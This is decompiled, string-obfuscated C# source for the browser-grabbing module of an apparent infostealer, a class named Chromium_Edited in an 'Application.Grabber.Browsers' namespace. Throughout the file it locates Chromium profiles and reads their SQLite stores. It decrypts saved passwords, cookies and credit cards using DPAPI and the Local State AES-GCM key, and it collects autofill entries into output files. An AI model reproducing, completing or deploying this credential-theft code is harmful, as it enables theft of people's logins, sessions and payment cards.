using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace Application.Grabber.Browsers
{
	// Token: 0x02000012 RID: 18
	internal class Chromium_Edited
	{
		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000070 RID: 112 RVA: 0x00003B0C File Offset: 0x00001D0C
		// (set) Token: 0x06000071 RID: 113 RVA: 0x00003B20 File Offset: 0x00001D20
		public static int Cookies { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000072 RID: 114 RVA: 0x00003B34 File Offset: 0x00001D34
		// (set) Token: 0x06000073 RID: 115 RVA: 0x00003B48 File Offset: 0x00001D48
		public static int Passwords { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000074 RID: 116 RVA: 0x00003B5C File Offset: 0x00001D5C
		// (set) Token: 0x06000075 RID: 117 RVA: 0x00003B70 File Offset: 0x00001D70
		public static int Forms { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000076 RID: 118 RVA: 0x00003B84 File Offset: 0x00001D84
		// (set) Token: 0x06000077 RID: 119 RVA: 0x00003B98 File Offset: 0x00001D98
		public static int Cards { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x06000078 RID: 120 RVA: 0x00003BAC File Offset: 0x00001DAC
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static List<FileObject> Execute()
		{
			List<FileObject> list = new List<FileObject>();
			List<ChromiumBrowserObject> list2 = new List<ChromiumBrowserObject>();
			foreach (string p in new List<string>
			{
				Paths.AppDataPath,
				Paths.LocalDataPath
			})
			{
				foreach (string text in delegate0e2.f0000e3(p, c0000c0.m00000f("»"), SearchOption.TopDirectoryOnly))
				{
					string text2 = delegate0e2.f0000e2(text, c0000c0.m00000f("Ýn.\u0005ÊI`CÍ\u0006+"), SearchOption.AllDirectories).First<string>().Replace(c0000c0.m00000f("ÍM\"\aÇ\u0005\u0013dØ\u0013:I"), c0000c0.m00000f(""));
					text2 = delegate0e2.f0000e3(text2, c0000c0.m00000f("Õd+\u0005Ó\u0005G"), SearchOption.TopDirectoryOnly).First<string>();
					list2.Add(new ChromiumBrowserObject(text.Replace(delegate0d0.f0000ba(p, c0000c0.m00000f("Í")), c0000c0.m00000f("")), delegate0d0.f0000ba(text2, c0000c0.m00000f("ÍM\"\u0003Ï\a\u0013sÍ\u0006/")), delegate0d0.f0000ba(text2, c0000c0.m00000f("ÍB\"\vÍ\0VD")), delegate0d0.f0000ba(text2, c0000c0.m00000f("ÍV(\u0006\u0086-RCÍ")), delegate0d0.f0000ba(text2.Replace(c0000c0.m00000f("ÍE(\u0002Ç\u001c_C"), c0000c0.m00000f("")), c0000c0.m00000f("ÍM\"\aÇ\u0005\u0013dØ\u0013:I"))));
				}
			}
			foreach (ChromiumBrowserObject chromiumBrowserObject in list2)
			{
				if (delegate0d2.f0000bf(chromiumBrowserObject.LoginDataPath))
				{
					list.Add(Chromium_Edited.GetPasswords(chromiumBrowserObject));
				}
				if (File.Exists(chromiumBrowserObject.CookiesPath))
				{
					list.Add(Chromium_Edited.GetCookies(chromiumBrowserObject));
				}
				if (File.Exists(chromiumBrowserObject.WebDataPath))
				{
					list.Add(Chromium_Edited.GetForms(chromiumBrowserObject));
					list.Add(Chromium_Edited.GetCards(chromiumBrowserObject));
				}
			}
			return list;
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00003DD4 File Offset: 0x00001FD4
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static FileObject GetPasswords(ChromiumBrowserObject browserObject)
		{
			StringBuilder p = new StringBuilder();
			Sqlite sqlite = new Sqlite(browserObject.LoginDataPath);
			if (!sqlite.ReadTable(c0000c0.m00000f("ýn*\rÈ\u001a")))
			{
				new Exception();
			}
			int rowCount = sqlite.GetRowCount();
			if (rowCount < 0)
			{
				new Exception();
			}
			for (int i = 0; i < rowCount; i++)
			{
				string value = sqlite.GetValue(i, 1);
				string value2 = sqlite.GetValue(i, 3);
				string text = Chromium_Edited.DecryptChromium(browserObject.LocalStatePath, sqlite.GetValue(i, 5));
				delegate0f7.f00010e(p, delegate0d1.f0000bd(new string[]
				{
					c0000c0.m00000f("Äs!^\u0086"),
					value,
					c0000c0.m00000f("\u009bM\"\u0003Ï\a\t\u0017"),
					value2,
					c0000c0.m00000f("\u009bQ,\u0017Õ\u001e\\EÈHn"),
					text,
					c0000c0.m00000f("\u009c\v")
				}));
				Chromium_Edited.Passwords++;
			}
			return new FileObject(c0000c0.m00000f("Ós\"\u0013Õ\fADð\"/_{à\"\u0015òñ@\u0012U°"), delegate0cd.f0000a6(p));
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00003EF0 File Offset: 0x000020F0
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static FileObject GetCookies(ChromiumBrowserObject browserObject)
		{
			StringBuilder p = new StringBuilder();
			Sqlite sqlite = new Sqlite(browserObject.CookiesPath);
			if (!sqlite.ReadTable(c0000c0.m00000f("òn\"\u000fÏ\f@")))
			{
				new Exception();
			}
			int rowCount = sqlite.GetRowCount();
			if (rowCount < 0)
			{
				new Exception();
			}
			for (int i = 0; i < rowCount; i++)
			{
				string text = Chromium_Edited.DecryptChromium(browserObject.LocalStatePath, sqlite.GetValue(i, 12));
				string value = sqlite.GetValue(i, 1);
				string value2 = sqlite.GetValue(i, 2);
				string value3 = sqlite.GetValue(i, 4);
				string value4 = sqlite.GetValue(i, 8);
				delegate0db f0000d = delegate0db.f0000d8;
				string value5 = sqlite.GetValue(i, 6);
				string text2 = c0000c0.m00000f("ÅS\u0018!");
				string text3 = f0000d(value5, c0000c0.m00000f("¡")) ? c0000c0.m00000f("×@\u00017ã") : c0000c0.m00000f("ÅS\u0018!");
				delegate0f7.f00010e(p, delegate0d1.f0000bd(new string[]
				{
					value,
					c0000c0.m00000f("\u0098"),
					text2,
					c0000c0.m00000f("\u0098"),
					value3,
					c0000c0.m00000f("\u0098"),
					text3,
					c0000c0.m00000f("\u0098"),
					value4,
					c0000c0.m00000f("\u0098"),
					value2,
					c0000c0.m00000f("\u0098"),
					text
				}));
				Chromium_Edited.Cookies++;
			}
			return new FileObject(c0000c0.m00000f("Ós\"\u0013Õ\fADð1!Ccþ(\u0014Ê") + browserObject.Name + c0000c0.m00000f("¿u5\u0010"), delegate0cd.f0000a6(p));
		}

		// Token: 0x0600007B RID: 123 RVA: 0x000040B0 File Offset: 0x000022B0
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static FileObject GetForms(ChromiumBrowserObject browserObject)
		{
			StringBuilder p = new StringBuilder();
			Sqlite sqlite = new Sqlite(browserObject.WebDataPath);
			if (!sqlite.ReadTable(c0000c0.m00000f("ðt9\vÀ\0_[")))
			{
				new Exception();
			}
			int rowCount = sqlite.GetRowCount();
			if (rowCount < 0)
			{
				new Exception();
			}
			for (int i = 0; i < rowCount; i++)
			{
				string value = sqlite.GetValue(i, 0);
				string value2 = sqlite.GetValue(i, 1);
				delegate0f7.f00010e(p, delegate0d1.f0000bd(new string[]
				{
					c0000c0.m00000f("ß` \u0001\u009cI"),
					value,
					c0000c0.m00000f("\u009bW,\bÓ\f\t\u0017"),
					value2,
					c0000c0.m00000f("\u009c\v")
				}));
				Chromium_Edited.Forms++;
			}
			return new FileObject(c0000c0.m00000f("Ós\"\u0013Õ\fADð4!^eäc\u0013îö"), delegate0cd.f0000a6(p));
		}

		// Token: 0x0600007C RID: 124 RVA: 0x000041A4 File Offset: 0x000023A4
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static FileObject GetCards(ChromiumBrowserObject browserObject)
		{
			StringBuilder p = new StringBuilder();
			Sqlite sqlite = new Sqlite(browserObject.WebDataPath);
			if (!sqlite.ReadTable(c0000c0.m00000f("òs(\0Ï\u001dlTÍ\0*_")))
			{
				new Exception();
			}
			int rowCount = sqlite.GetRowCount();
			if (rowCount < 0)
			{
				new Exception();
			}
			for (int i = 0; i < rowCount; i++)
			{
				string text = Chromium_Edited.DecryptChromium(browserObject.LocalStatePath, sqlite.GetValue(i, 4));
				string value = sqlite.GetValue(i, 1);
				string value2 = sqlite.GetValue(i, 2);
				string value3 = sqlite.GetValue(i, 3);
				string value4 = sqlite.GetValue(i, 9);
				delegate0f7.f00010e(p, delegate0d1.f0000bd(new string[]
				{
					value,
					c0000c0.m00000f("\u0098"),
					value2,
					c0000c0.m00000f("¾"),
					value3,
					c0000c0.m00000f("\u0098"),
					text,
					c0000c0.m00000f("\u0098"),
					value4,
					c0000c0.m00000f("\u009c\v")
				}));
				Chromium_Edited.Cards++;
			}
			return new FileObject(c0000c0.m00000f("Ós\"\u0013Õ\fADð1/^läc\u0013îö"), delegate0cd.f0000a6(p));
		}

		// Token: 0x0600007D RID: 125 RVA: 0x000042EC File Offset: 0x000024EC
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static string DecryptChromium(string localStatePath, string chiperText)
		{
			string result;
			if (chiperText.StartsWith(c0000c0.m00000f("ç0}")) || chiperText.StartsWith(c0000c0.m00000f("ç0|")))
			{
				result = Chromium_Edited.DecryptV10(localStatePath, chiperText);
			}
			else
			{
				result = Chromium_Edited.DecryptBlob(chiperText, DataProtectionScope.CurrentUser, null).Trim();
			}
			return result;
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00004338 File Offset: 0x00002538
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return delegate0df.f0000df(delegate0d6.f0000cb(), Chromium_Edited.DecryptBlob(delegate0d7.f0000d1(delegate0d6.f0000cc(), EncryptedData), dataProtectionScope, entropy));
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00004378 File Offset: 0x00002578
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static string DecryptV10(string localStatePath, string chiperText)
		{
			int num = 12;
			string text = c0000c0.m00000f("ç0}");
			string text2 = c0000c0.m00000f("ÕQ\f4ï");
			string empty = string.Empty;
			string p = delegate0e4.f0000ea(localStatePath).FromJSON()[c0000c0.m00000f("þr\u0012\aÔ\u0010CC")][c0000c0.m00000f("ôo.\u0016ß\u0019GRÈ-%Iq")].ToString(false);
			string p2 = delegate0df.f0000df(delegate0d6.f0000cc(), delegate0f8.f000111(p)).Substring(text2.Length);
			byte[] key = Chromium_Edited.DecryptBlob(delegate0d7.f0000d1(delegate0d6.f0000cc(), p2), DataProtectionScope.CurrentUser, null);
			byte[] p3 = delegate0d7.f0000d1(delegate0d6.f0000cc(), chiperText.Substring(text.Length, num));
			return AesGcm256.Decrypt(delegate0d7.f0000d1(delegate0d6.f0000cc(), chiperText.Substring(num + text.Length)), key, p3);
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00004478 File Offset: 0x00002678
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static byte[] DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			if (EncryptedData == null || EncryptedData.Length == 0)
			{
				new Exception();
			}
			return ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000044A0 File Offset: 0x000026A0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Chromium_Edited()
		{
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000044A8 File Offset: 0x000026A8
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Chromium_Edited()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x04000027 RID: 39
		[CompilerGenerated]
		private static int f00001d;

		// Token: 0x04000028 RID: 40
		[CompilerGenerated]
		private static int f00001e;

		// Token: 0x04000029 RID: 41
		[CompilerGenerated]
		private static int f00001f;

		// Token: 0x0400002A RID: 42
		[CompilerGenerated]
		private static int f000020;
	}
}
